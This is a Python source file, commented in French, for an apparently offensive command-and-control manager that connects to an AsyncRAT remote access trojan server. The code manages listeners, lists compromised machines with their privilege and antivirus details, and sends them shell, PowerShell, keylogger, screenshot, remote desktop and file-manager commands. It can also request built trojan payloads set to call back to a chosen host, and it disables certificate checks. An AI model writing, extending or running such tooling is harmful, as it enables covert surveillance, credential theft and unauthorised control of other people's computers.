"""
AsyncRAT — TCP/SSL listener + plugin system.

AsyncRAT (github.com/NYAN-x-CAT/AsyncRAT-C-Sharp) — RAT C# open-source.
Port par défaut : 6606 (TCP avec SSL)
Serveur        : .NET Windows application
Protocole      : paquets chiffrés AES-256-CBC sur SSL TCP
Encryption     : clé dérivée via PBKDF2-SHA1 depuis le mot de passe
Format paquet  : [4 bytes length (big-endian)][JSON payload chiffré + IV]

Commandes principales (packet type field) :
  Ping, Pong, GetSystemInfo, FileManager, RemoteDesktop,
  Screenshot, Keylogger, RunProcess, PowerShell, HRDP,
  CloseServer, Update, Uninstall, Reconnect, Disconnect, GetPlugin

Note : AsyncRAT n'a pas de REST API native. L'intégration se connecte
directement au serveur via un "management socket" ou un client TCP custom.

Modes (config.extra["mode"]) :
  "api"  — REST API wrapper (si un wrapper est déployé sur le serveur)
  "tcp"  — connexion TCP directe au management port (défaut)
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import struct
import uuid
from base64 import b64encode, b64decode
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError, C2ConnectionError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)

# Types de paquets AsyncRAT
_PKT_PING        = "Ping"
_PKT_PONG        = "Pong"
_PKT_SYSINFO     = "GetSystemInfo"
_PKT_CLIENTS     = "GetClients"
_PKT_SHELL       = "RunProcess"
_PKT_PS          = "PowerShell"
_PKT_SCREENSHOT  = "Screenshot"
_PKT_KEYLOGGER   = "Keylogger"
_PKT_FILE_MGR    = "FileManager"
_PKT_RDSK        = "RemoteDesktop"
_PKT_PLUGIN      = "GetPlugin"
_PKT_UNINSTALL   = "Uninstall"
_PKT_UPDATE      = "Update"
_PKT_RECONNECT   = "Reconnect"
_PKT_DISCONNECT  = "Disconnect"


class AsyncRatC2(RestC2Interface):
    """
    AsyncRAT — TCP/SSL client custom + REST API wrapper optionnel.

    Paramètres extra (config.extra) :
      mode       : "tcp" | "api"   (défaut: "tcp")
      api_port   : int             (port du wrapper REST, défaut: 8080)
      password   : str             (mot de passe AES pour le TCP)
      verify_ssl : bool            (défaut: False)
      mgmt_port  : int             (port management TCP si différent du port principal)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "screenshot", "keylogger", "remote_desktop",
        "file_manager", "powershell", "run_process", "plugin_load",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._mode          = "tcp"
        self._tcp_reader:   asyncio.StreamReader | None = None
        self._tcp_writer:   asyncio.StreamWriter | None = None
        self._tcp_lock      = asyncio.Lock()
        self._aes_key:      bytes | None = None
        self._sessions:     dict[str, dict[str, Any]] = {}

    # ── Connexion ─────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config = config
        self._mode   = config.extra.get("mode", "tcp")

        if self._mode == "api":
            return await self._connect_api(config)
        return await self._connect_tcp(config)

    async def _connect_api(self, config: C2Config) -> bool:
        api_port = int(config.extra.get("api_port", 8080))
        scheme   = "https" if config.ssl else "http"
        base_url = f"{scheme}://{config.host}:{api_port}"

        self._client = httpx.AsyncClient(
            base_url=base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=30.0,
        )
        # Test de connexion
        try:
            resp = await self._client.get("/api/status", timeout=5.0)
            if resp.status_code not in (200, 401, 403):
                raise C2ConnectionError(f"AsyncRAT API inaccessible [{resp.status_code}]")
        except httpx.ConnectError as exc:
            raise C2ConnectionError(f"AsyncRAT API connexion refusée : {exc}") from exc

        self._token  = config.extra.get("api_key", "no-auth")
        self._status = C2Status.CONNECTED
        logger.info("AsyncRAT : connecté via REST API → %s", base_url)
        return True

    async def _connect_tcp(self, config: C2Config) -> bool:
        """Connexion TCP au management port AsyncRAT (custom protocol)."""
        mgmt_port = int(config.extra.get("mgmt_port", config.port))
        password  = config.password or config.extra.get("password", "AsyncRAT#1234")

        # Dériver la clé AES depuis le password (PBKDF2-SHA1, 50000 iter, 32 bytes)
        salt      = b"AsyncRAT\x00" * 4  # sel par défaut AsyncRAT
        self._aes_key = hashlib.pbkdf2_hmac("sha1", password.encode(), salt, 50000, dklen=32)

        try:
            ssl_ctx = None
            if config.ssl:
                import ssl as _ssl
                ssl_ctx = _ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode    = _ssl.CERT_NONE

            self._tcp_reader, self._tcp_writer = await asyncio.wait_for(
                asyncio.open_connection(config.host, mgmt_port, ssl=ssl_ctx),
                timeout=self.CONNECT_TIMEOUT,
            )
        except asyncio.TimeoutError as exc:
            raise C2ConnectionError(f"AsyncRAT TCP timeout : {config.host}:{mgmt_port}") from exc
        except OSError as exc:
            raise C2ConnectionError(f"AsyncRAT TCP connexion échouée : {exc}") from exc

        # Envoi du ping de handshake
        pong = await self._tcp_call({_PKT_PING: True})
        if not pong:
            logger.warning("AsyncRAT : pas de réponse au ping initial")

        self._status = C2Status.CONNECTED
        logger.info("AsyncRAT : connecté TCP → %s:%d", config.host, mgmt_port)
        return True

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._tcp_writer:
            try:
                self._tcp_writer.close()
                await self._tcp_writer.wait_closed()
            except Exception:
                pass
            self._tcp_writer = None
            self._tcp_reader = None
        if self._client:
            await self._client.aclose()
            self._client = None
        self._status = C2Status.DISCONNECTED

    # ── Protocole TCP AsyncRAT ────────────────────────────────────────────────

    def _aes_encrypt(self, plaintext: str) -> bytes:
        """Chiffrement AES-256-CBC du payload JSON."""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding as sym_padding
        import os
        if not self._aes_key:
            return plaintext.encode()
        iv      = os.urandom(16)
        padder  = sym_padding.PKCS7(128).padder()
        padded  = padder.update(plaintext.encode()) + padder.finalize()
        cipher  = Cipher(algorithms.AES(self._aes_key), modes.CBC(iv))
        enc     = cipher.encryptor()
        ct      = enc.update(padded) + enc.finalize()
        return iv + ct

    def _aes_decrypt(self, ciphertext: bytes) -> str:
        """Déchiffrement AES-256-CBC du payload JSON."""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding as sym_padding
        if not self._aes_key or len(ciphertext) < 16:
            return ciphertext.decode(errors="replace")
        iv      = ciphertext[:16]
        ct      = ciphertext[16:]
        cipher  = Cipher(algorithms.AES(self._aes_key), modes.CBC(iv))
        dec     = cipher.decryptor()
        padded  = dec.update(ct) + dec.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        return (unpadder.update(padded) + unpadder.finalize()).decode()

    async def _tcp_call(
        self, payload: dict[str, Any], timeout: float = 15.0
    ) -> dict[str, Any] | None:
        """Envoi d'un paquet au management socket AsyncRAT."""
        async with self._tcp_lock:
            if not self._tcp_writer or not self._tcp_reader:
                raise C2ConnectionError("AsyncRAT TCP non connecté")
            try:
                raw_json = json.dumps(payload)
                try:
                    body = self._aes_encrypt(raw_json)
                except ImportError:
                    body = raw_json.encode()

                # Frame : [4 bytes length big-endian][body]
                frame = struct.pack(">I", len(body)) + body
                self._tcp_writer.write(frame)
                await self._tcp_writer.drain()

                # Lecture réponse
                header = await asyncio.wait_for(
                    self._tcp_reader.readexactly(4), timeout=timeout
                )
                resp_len = struct.unpack(">I", header)[0]
                if resp_len > 10 * 1024 * 1024:
                    return None
                resp_body = await asyncio.wait_for(
                    self._tcp_reader.readexactly(resp_len), timeout=timeout
                )
                try:
                    resp_str = self._aes_decrypt(resp_body)
                except ImportError:
                    resp_str = resp_body.decode(errors="replace")
                return json.loads(resp_str)
            except (asyncio.TimeoutError, asyncio.IncompleteReadError, json.JSONDecodeError):
                return None

    # ── Auth (pour RestC2Interface en mode API) ───────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        return config.extra.get("api_key", "no-auth")

    async def get_status(self) -> C2Status:
        if self._mode == "api":
            if not self._client:
                return C2Status.DISCONNECTED
            try:
                resp = await self._client.get("/api/status", timeout=5.0)
                return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
            except Exception:
                return C2Status.ERROR
        else:
            if not self._tcp_writer or self._tcp_writer.is_closing():
                return C2Status.DISCONNECTED
            try:
                resp = await self._tcp_call({_PKT_PING: True}, timeout=5.0)
                return C2Status.CONNECTED if resp else C2Status.ERROR
            except Exception:
                return C2Status.ERROR

    # ── Listeners ─────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        host = config.get("bind_host", "0.0.0.0")
        port = int(config.get("bind_port", 6606))
        name = config.get("name", f"asyncrat-{port}")
        ssl  = config.get("ssl", True)

        if self._mode == "tcp":
            resp = await self._tcp_call({
                "Action":   "AddPort",
                "Host":     host,
                "Port":     port,
                "SSL":      ssl,
                "Password": self._config.password or "AsyncRAT#1234",
            })
            lid    = str(resp.get("ID") or uuid.uuid4()) if resp else str(uuid.uuid4())
            status = "running" if (resp or {}).get("Status") == "OK" else "stopped"
        else:
            data   = await self._post("/api/listeners", json={"host": host, "port": port, "ssl": ssl})
            lid    = str(data.get("id") or uuid.uuid4())
            status = "running" if data.get("active", True) else "stopped"

        return Listener(
            id=lid, name=name, c2_type=self._config.c2_type,
            bind_host=host, bind_port=port,
            protocol="ssl-tcp" if ssl else "tcp",
            status=status,
            meta={"ssl": ssl, "password": "***"},
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        if self._mode == "tcp":
            resp = await self._tcp_call({"Action": "RemovePort", "ID": listener_id})
            return (resp or {}).get("Status") == "OK"
        try:
            await self._delete(f"/api/listeners/{listener_id}")
            return True
        except Exception:
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        if self._mode == "tcp":
            resp  = await self._tcp_call({"Action": "GetPorts"})
            items = (resp or {}).get("Ports", [])
        else:
            data  = await self._get("/api/listeners")
            items = data if isinstance(data, list) else data.get("listeners", [])
        return [
            Listener(
                id=str(l.get("ID") or l.get("id") or uuid.uuid4()),
                name=str(l.get("Port") or l.get("name", "")),
                c2_type=self._config.c2_type,
                bind_host=l.get("Host") or l.get("host", "0.0.0.0"),
                bind_port=int(l.get("Port") or l.get("port", 6606)),
                protocol="ssl-tcp" if l.get("SSL", True) else "tcp",
                status="running" if l.get("Active", True) or l.get("active", True) else "stopped",
            )
            for l in items
        ]

    # ── Clients (agents) ──────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        if self._mode == "tcp":
            resp  = await self._tcp_call({"Action": _PKT_CLIENTS})
            items = (resp or {}).get("Clients", [])
        else:
            data  = await self._get("/api/clients")
            items = data if isinstance(data, list) else data.get("clients", [])
        return [self._parse_client(c) for c in items]

    def _parse_client(self, c: dict[str, Any]) -> Implant:
        cid = str(c.get("ID") or c.get("id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        is_admin = c.get("IsAdmin") or c.get("admin", False)
        integrity = "ADMIN" if is_admin else "USER"

        return Implant(
            id=cid,
            name=c.get("ComputerName") or c.get("hostname") or cid,
            c2_type=self._config.c2_type,
            listener_id=str(c.get("Port") or c.get("listener_id", "")),
            external_ip=c.get("IP") or c.get("ip", ""),
            internal_ip=c.get("LocalIP") or c.get("local_ip", ""),
            hostname=c.get("ComputerName") or c.get("hostname", ""),
            username=c.get("AccountName") or c.get("username", ""),
            os=c.get("OS") or c.get("os", ""),
            arch=c.get("CPU") or c.get("arch", ""),
            pid=int(c.get("PID") or c.get("pid", 0)),
            process_name=c.get("Process") or c.get("process", ""),
            integrity=integrity,
            last_checkin=_dt(c.get("LastSeen") or c.get("last_seen")),
            first_seen=_dt(c.get("Connected") or c.get("first_seen")),
            active=not bool(c.get("Disconnected") or c.get("dead", False)),
            meta={
                "antivirus": c.get("AntiVirus") or c.get("av", ""),
                "firewall":  c.get("Firewall") or c.get("fw", ""),
                "version":   c.get("Version") or c.get("version", ""),
                "tag":       c.get("Tag") or c.get("tag", ""),
            },
        )

    # ── Commandes ─────────────────────────────────────────────────────────────

    _CMD_MAP: dict[str, str] = {
        "shell":      _PKT_SHELL,
        "cmd":        _PKT_SHELL,
        "ps":         _PKT_PS,
        "powershell": _PKT_PS,
        "screenshot": _PKT_SCREENSHOT,
        "keylog":     _PKT_KEYLOGGER,
        "rdp":        _PKT_RDSK,
        "desktop":    _PKT_RDSK,
        "files":      _PKT_FILE_MGR,
        "ls":         _PKT_FILE_MGR,
        "sysinfo":    _PKT_SYSINFO,
        "update":     _PKT_UPDATE,
        "uninstall":  _PKT_UNINSTALL,
        "reconnect":  _PKT_RECONNECT,
        "disconnect": _PKT_DISCONNECT,
        "plugin":     _PKT_PLUGIN,
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "shell"
        pkt_type  = self._CMD_MAP.get(cmd_lower, _PKT_SHELL)
        extra     = cmd_parts[1:] + args_list
        task_id   = str(uuid.uuid4())

        payload = {
            "Action":   pkt_type,
            "ClientID": agent_id,
            "Command":  " ".join(extra) if extra else command,
            "TaskID":   task_id,
        }
        if pkt_type == _PKT_FILE_MGR:
            payload["Path"] = extra[0] if extra else "C:\\"

        if self._mode == "tcp":
            resp   = await self._tcp_call(payload, timeout=60.0)
            output = (resp or {}).get("Output") or (resp or {}).get("Result", "")
            return Task(
                id=(resp or {}).get("TaskID", task_id),
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args_list,
                status="completed" if output else "sent",
                result=output,
                completed_at=datetime.utcnow() if output else None,
                meta={"packet_type": pkt_type},
            )
        else:
            data = await self._post("/api/task", json={"client_id": agent_id, "type": pkt_type, "args": extra})
            return Task(
                id=str(data.get("task_id") or task_id),
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=command,
                args=args_list,
                status=data.get("status", "queued"),
                meta={"packet_type": pkt_type},
            )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        if self._mode == "tcp":
            resp = await self._tcp_call({"Action": "GetTaskResult", "TaskID": task_id})
            return {"task_id": task_id, "status": "completed", "output": (resp or {}).get("Output", "")}
        data = await self._get(f"/api/tasks/{task_id}")
        return {"task_id": task_id, "status": data.get("status"), "output": data.get("output", "")}

    # ── Payload (builder config) ──────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        host = config.extra.get("callback_host", self._config.host)
        port = config.extra.get("callback_port", self._config.port)

        if self._mode == "tcp":
            resp = await self._tcp_call({
                "Action":   "BuildClient",
                "Host":     host,
                "Port":     port,
                "Password": self._config.password or "AsyncRAT#1234",
                "Version":  config.extra.get("version", "AsyncRAT 0.5.8B"),
                "Mutex":    config.extra.get("mutex", uuid.uuid4().hex[:8]),
                "Install":  config.extra.get("install", False),
                "Format":   config.format,
            }, timeout=120.0)
            if not resp:
                return b""
            b64_data = resp.get("Binary") or resp.get("base64", "")
            if b64_data:
                return b64decode(b64_data)
            return b""

        data    = await self._post("/api/build", json={
            "host": host, "port": port, "format": config.format, "arch": config.arch,
        })
        b64 = data.get("data") or data.get("binary", "")
        return b64decode(b64) if b64 else b""

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
